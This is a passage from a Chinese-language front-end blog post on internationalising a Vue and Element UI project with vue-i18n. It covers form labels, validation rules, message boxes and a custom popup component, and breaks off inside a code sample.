class="name">el-form-item</span>&gt;</span></span><br></pre></td></tr></table></figure><p>选择框输入框，我将其都放在 viewC 对象中，并按照，如下方式命名：</p><ul><li>没有加 Holder 后缀的后面需要加 <code>：</code>，有加 Holder 后缀的前面需要加 <code>请输入/请选择</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ps = <span class="string">&#x27;请选择&#x27;</span></span><br><span class="line"><span class="keyword">const</span> pi = <span class="string">&#x27;请输入&#x27;</span></span><br><span class="line"><span class="keyword">const</span> end = <span class="string">&#x27;：&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> viewsC = &#123;</span><br><span class="line">  startDate: <span class="string">&#x27;起始日期&#x27;</span>,</span><br><span class="line">  startDateHolder: ps + <span class="string">&#x27;起始日期&#x27;</span>,</span><br><span class="line">  stopDate: <span class="string">&#x27;截止日期&#x27;</span>,</span><br><span class="line">  stopDateHolder: ps + <span class="string">&#x27;截止日期&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">in</span> viewsC) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!item.includes(<span class="string">&#x27;Holder&#x27;</span>)) &#123;</span><br><span class="line">    viewsC[item] = viewsC[item] + end</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!viewsC[item].includes(<span class="string">&#x27;请&#x27;</span>)) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(viewsC[item] + <span class="string">&#x27;需要加 ps 或 pi&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>详细例子可以参考 <code>2.选择框、输入框表单校验</code>，表格 Table 跟这个同理 <code>el-table-column : label=&quot;$t(&#39;tableC.xxx)&quot;</code> 即可</p><h2 id="2-选择框、输入框表单校验"><a href="#2-选择框、输入框表单校验" class="headerlink" title="* 2.选择框、输入框表单校验"></a>* 2.选择框、输入框表单校验</h2><p>如果直接把 rules 校验规则写在 data 里面，Element 内部对其 this 进行了处理，所以需要换一种思路</p><ol><li><p>使用 computed 计算属性</p></li><li><p>写在 data 里面，在 return 之前是可以拿到 this的，message 取到这个变量即可（不过这个切换语言不能实时更新）</p><p>注意：如果使用自定义规则是可以实时更新的，但是出于复用性一般会将其抽到 utils 方法库中，这样就会产生其他问题</p><ul><li>this 无法处理</li><li>简单认证还得写复杂的自定义规则</li></ul><p>所以这个不是一个好方法，推荐使用计算属性</p></li></ol><p>出于复用性将方法抽到 utils 方法库中，直接写是不行的（Element 内部对其 this 进行了处理），需要结合 <code>bind/call/apply</code> 来使用</p><p><code>pattern: &#39;[^ \x22]+&#39;</code> 是校验不能全部为空格</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">el-scrollbar</span> <span class="attr">wrap-class</span>=<span class="string">&quot;scrollbar-wrapper&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height: 100%;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-form</span> <span class="attr">ref</span>=<span class="string">&quot;rowsForm&quot;</span> <span class="attr">:model</span>=<span class="string">&quot;rowsFormData&quot;</span> <span class="attr">:rules</span>=<span class="string">&quot;rules&quot;</span> <span class="attr">label-width</span>=<span class="string">&quot;130px&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-row</span> <span class="attr">:gutter</span>=<span class="string">&quot;20&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">&quot;8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">:label</span>=<span class="string">&quot;$t(&#x27;viewsC.animal&#x27;)&quot;</span> <span class="attr">prop</span>=<span class="string">&quot;animal&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">v-model</span>=<span class="string">&quot;rowsFormData.animal&quot;</span> <span class="attr">:placeholder</span>=<span class="string">&quot;$t(&#x27;viewsC.animalHolder&#x27;)&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">&quot;8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">:label</span>=<span class="string">&quot;$t(&#x27;viewsC.plants&#x27;)&quot;</span> <span class="attr">prop</span>=<span class="string">&quot;plants&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">v-model</span>=<span class="string">&quot;rowsFormData.plants&quot;</span> <span class="attr">:placeholder</span>=<span class="string">&quot;$t(&#x27;viewsC.plantsHolder&#x27;)&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-row</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">el-form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">el-scrollbar</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">import</span> &#123; ValidAnimal &#125; <span class="keyword">from</span> <span class="string">&#x27;@/utils/viewValidate&#x27;</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line">      rowsFormData: &#123;</span><br><span class="line"><span class="javascript">        animal: <span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        plants: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  computed: &#123;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">rules</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">        animal: [&#123; <span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">validator</span>: ValidAnimal.bind(<span class="built_in">this</span>), <span class="attr">trigger</span>: <span class="string">&#x27;change&#x27;</span>, <span class="attr">pattern</span>: <span class="string">&#x27;[^ \x22]+&#x27;</span> &#125;],</span></span><br><span class="line">        plants: [</span><br><span class="line"><span class="javascript">          &#123; <span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="built_in">this</span>.$t(<span class="string">&#x27;form.plantsTip&#x27;</span>), <span class="attr">trigger</span>: <span class="string">&#x27;blur&#x27;</span>, <span class="attr">pattern</span>: <span class="string">&#x27;[^ \x22]+&#x27;</span> &#125;,</span></span><br><span class="line"><span class="javascript">          &#123; <span class="attr">max</span>: <span class="number">5</span>, <span class="attr">message</span>: <span class="built_in">this</span>.$t(<span class="string">&#x27;form.maxLength10&#x27;</span>), <span class="attr">trigger</span>: <span class="string">&#x27;blur&#x27;</span> &#125;</span></span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-弹出框（MessageBox-或-Notification）"><a href="#3-弹出框（MessageBox-或-Notification）" class="headerlink" title="3.弹出框（MessageBox 或 Notification）"></a>3.弹出框（MessageBox 或 Notification）</h2><p>弹出框的 title 是可以使用 this 的，不过需要注意：</p><ul><li><p>如果使用 function，是拿不到 this 的（可能由于代码不规范导致有这个问题）</p><p><strong>要么用一个变量存，要么使用箭头函数</strong></p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> self = <span class="built_in">this</span></span><br><span class="line"><span class="built_in">this</span>.$confirm(<span class="built_in">this</span>.$t(<span class="string">&#x27;info.notify1&#x27;</span>) , <span class="built_in">this</span>.$t(<span class="string">&#x27;info.friendlyTips&#x27;</span>), &#123;</span><br><span class="line">  type: <span class="string">&#x27;warning&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> params = &#123; &#125;</span><br><span class="line">    self.listLoading = <span class="literal">true</span></span><br><span class="line">    Api(params)</span><br><span class="line">      .then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        self.$notify(&#123; <span class="attr">title</span>: self.$t(<span class="string">&#x27;info.friendlyTips&#x27;</span>), <span class="attr">message</span>: res.data.msg, <span class="attr">type</span>: <span class="string">&#x27;success&#x27;</span> &#125;)</span><br><span class="line">        self.getList()</span><br><span class="line">      &#125;)</span><br><span class="line">      .catch(<span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e)</span><br><span class="line">      &#125;)</span><br><span class="line">      .finally(<span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">        self.listLoading = <span class="literal">false</span></span><br><span class="line">      &#125;)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><h2 id="4-自制弹出框组件国际化（方式一）"><a href="#4-自制弹出框组件国际化（方式一）" class="headerlink" title="4.自制弹出框组件国际化（方式一）"></a>4.自制弹出框组件国际化（方式一）</h2><p>自制弹出框国际化其实一直是一个难点，可能对混入机制不大了解，所以会出现很多问题</p><h3 id="popup-js-中处理"><a href="#popup-js-中处理" class="headerlink" title="popup.js 中处理"></a>popup.js 中处理</h3><p>结合 <code>el-dialog</code> 自制弹出框组件，需要在创建实例时混入 <code>$i18n</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;@/store&#x27;</span></span><br><span class="line"><span class="keyword">import</span> i18n <span class="keyword">from</span> <span class="string">&#x27;@/lang&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span>(<span class="params">el, params</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 初始化一个Promise</span></span><br><span class="line">  <span class="keyword">let</span> resolve</span><br><span class="line">  <span class="keyword">let</span> reject</span><br><span class="line">  <span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">    resolve = res</span><br><span class="line">    reject = rej</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">// 初始化弹窗</span></span><br><span class="line">  <span class="keyword">const</span> Popups = Vue.extend(el)</span><br><span class="line">  <span class="keyword">const</span> vEl = <span class="keyword">new</span> Popups(&#123;</span><br><span class="line">    store,</span><br><span class="line">    i18n,</span><br><span class="line">    propsData: &#123;</span><br><span class="line">      params: <span class="built_in">Object</span>.assign(&#123;&#125;, params)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        visible: <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">      <span class="function"><span class="title">resolve</span>(<span class="params">arg</span>)</span> &#123;</span><br><span class="line">        resolve(arg)</span><br><span class="line">        <span class="built_in">this</span>.visible = <span class="literal">false</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="function"><span class="title">reject</span>(<span class="params">arg</span>)</span> &#123;</span><br><span class="line">        reject(arg)</span><br><span class="line">        <span class="built_in">this</span>.visible = <span class="literal">false</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="function"><span class="title">closed</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.visible = <span class="literal">false</span></span><br><span class="line">        removePopup()</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">// 把弹窗挂载到body</span></span><br><span class="line">  <span class="keyword">const</span> shadeEl = vEl.$mount().$el</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(shadeEl)</span><br><span class="line">  <span class="comment">// 从body中移除弹窗体</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">removePopup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.body.removeChild(shadeEl)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> promise</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="popup-vue-组件"><a href="#popup-vue-组件" class="headerlink" title="popup.vue 组件"></a>popup.vue 组件</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  &lt;el-dialog</span><br><span class="line">    :title=&quot;title&quot;</span><br><span class="line">    :width=&quot;width&quot;</span><br><span class="line">    :visible.sync=&quot;visible&quot;</span><br><span class="line">    append-to-body</span><br><span class="line">    :close-on-click-modal=&quot;false&quot;</span><br><span class="line">    :close-on-press-escape=&quot;false&quot;</span><br><span class="line">    :show-close=&quot;showClose&quot;</span><br><span class="line">    :modal=&quot;modal&quot;</span><br><span class="line">    :custom-class=&quot;customClass&quot;</span><br><span class="line">    class=&quot;popup-wrapper&quot;</span><br><span class="line">    :top=&quot;top&quot;</span><br><span class="line">    @closed=&quot;closed&quot;</span><br><span class="line">  &gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;popup__body&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">slot</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;!isFooter&quot;</span> <span class="attr">slot</span>=<span class="string">&quot;footer&quot;</span> <span class="attr">class</span>=<span class="string">&quot;dialog-footer&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;footer&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">&quot;onCancel&quot;</span>&gt;</span>&#123;&#123; $t(&#x27;tools.cancel&#x27;) &#125;&#125;<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;onSubmit&quot;</span>&gt;</span>&#123;&#123; $t(&#x27;tools.confirm&#x27;) &#125;&#125;<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">el-dialog</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  name: <span class="string">&#x27;UiPopup&#x27;</span>,</span></span><br><span class="line">  props: &#123;</span><br><span class="line">    value: &#123;</span><br><span class="line"><span class="javascript">      type: [<span class="built_in">String</span>, <span class="built_in">Object</span>, <span class="built_in">Array</span>, <span class="built_in">Number</span>, <span class="built_in">Boolean</span>],</span></span><br><span class="line"><span class="javascript">      <span class="keyword">default</span>: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line">    &#125;,</span><br><span class="line">    title: &#123;</span><br><span class="line"><span class="javascript">      type: <span class="built_in">String</span>,</span></span><br><span class="line"><span class="javascript">      <span class="keyword">default</span>: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line">    &#125;,</span><br><span class="line">    width: &#123;</span><br><span class="line"><span class="javascript">      type: <span class="built_in">String</span>,</span></span><br><span class="line"><span class="javascript">      <span class="keyword">default</span>: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line">    &#125;,</span><br><span class="line">    isFooter: &#123;</span><br><span class="line"><span class="javascript">      type: <span class="built_in">String</span>,</span></span><br><span class="line"><span class="javascript">      <span class="keyword">default</span>: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line">    &#125;,</span><br><span class="line">    showClose: &#123;</span><br><span class="line"><span class="javascript">      type: <span class="built_in">Boolean</span>,</span></span><br><span class="line"><span class="javascript">      <span class="keyword">default</span>: <span class="literal">true</span></span></span><br><span class="line">    &#125;,</span><br><span class="line">    modal: &#123;</span><br><span class="line"><span class="javascript">      type: <span class="built_in">Boolean</span>,</span></span><br><span class="line"><span class="javascript">      <span class="keyword">default</span>: <span class="literal">true</span></span></span><br><span class="line">    &#125;,</span><br><span class="line">    customClass: &#123;</span><br><span class="line"><span class="javascript">      type: <span class="built_in">String</span>,</span></span><br><span class="line"><span class="javascript">      <span class="keyword">default</span>: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line">    &#125;,</span><br><span class="line">    top: &#123;</span><br><span class="line"><span class="javascript">      type: <span class="built_in">String</span>,</span></span><br><span class="line"><span class="javascript">      <span class="keyword">default</span>: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  computed: &#123;</span><br><span class="line"><span class="javascript">    <span class="comment">// visible控制器，点X时调用取消</span></span></span><br><span class="line">    visible: &#123;</span><br><span class="line"><span class="javascript">      get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="built_in">this</span>.$parent.visible</span></span><br><span class="line">      &#125;,</span><br><span class="line"><span class="javascript">      set: <span class="function"><span class="keyword">function</span>(<span class="params">v</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.$parent.reject(<span class="built_in">this</span>.value)</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">onCancel</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.$emit(<span class="string">&#x27;onCancel&#x27;</span>, <span class="built_in">this</span>.value)</span></span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">onSubmit</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.$emit(<span class="string">&#x27;onSubmit&#x27;</span>, <span class="built_in">this</span>.value)</span></span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    <span class="comment">// 点 X 关闭时调用父组件的注入</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">closed</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.$parent.closed()</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="components-下的-index-js"><a href="#components-下的-index-js" class="headerlink" title="components 下的 index.js"></a>components 下的 index.js</h3><p>把 popup 通过全局方式注册</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> popup <span class="keyword">from</span> <span class="string">&#x27;./Popup/popup.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> jsPopup <span class="keyword">from</span> <span class="string">&#x27;./Popup/popup.js&#x27;</span></span><br><span class="line"><span class="keyword">const</span> components = [</span><br><span class="line">  popup</span><br><span class="line">]</span><br><span class="line"><span class="keyword">const</span> jsComponents = &#123;</span><br><span class="line">  $popup: jsPopup</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 出口函数为组件安装函数</span></span><br><span class="line"><span class="keyword">const</span> install = <span class="function"><span class="params">Vue</span> =&gt;</span> &#123;</span><br><span class="line">  components.forEach(<span class="function"><span class="params">component</span> =&gt;</span> &#123;</span><br><span class="line">    Vue.component(component.name, component)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> jsComponents) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!Vue.prototype.hasOwnProperty(key)) &#123;</span><br><span class="line">      Vue.prototype[key] = jsComponents[key]</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.warn(key + <span class="string">&#x27;被占用&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  install</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="main-js"><a href="#main-js" class="headerlink" title="main.js"></a>main.js</h3><p>这样就可以在全局使用 <code>$popup</code> 了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> globalComponents <span class="keyword">from</span> <span class="string">&#x27;@/components&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(globalComponents)</span><br></pre></td></tr></table></figure><h2 id="5-自制弹出框组件国际化（方式二，需改善）"><a href="#5-自制弹出框组件国际化（方式二，需改善）" class="headerlink" title="* 5.自制弹出框组件国际化（方式二，需改善）"></a>* 5.自制弹出框组件国际化（方式二，需改善）</h2><h3 id="main-js-1"><a href="#main-js-1" class="headerlink" title="main.js"></a>main.js</h3><p>这样就可以在全局使用 <code>MsgBox / msg-box</code> 了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> MsgBox <span class="keyword">from</span> <span class="string">&#x27;@/components/MsgBox/MsgBox&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.component(<span class="string">&#x27;MsgBox&#x27;</span>, MsgBox)</span><br></pre></td></tr></table></figure><h3 id="页面中使用"><a href="#页面中使用" class="headerlink" title="页面中使用"></a>页面中使用</h3><p>在页面中结合 <code>$msgbox</code> 使用，在 message 中使用组件，因为 <code>msg-box</code> 组件是动态创建的，<code>$i18n</code> 是在全局一开始混入，所以在其中拿不到 <code>i18n</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.$msgbox(&#123;</span><br><span class="line">  title: <span class="string">&#x27;xxx&#x27;</span>,</span><br><span class="line">  message: <span class="xml"><span class="tag">&lt;<span class="name">msg-box</span> <span 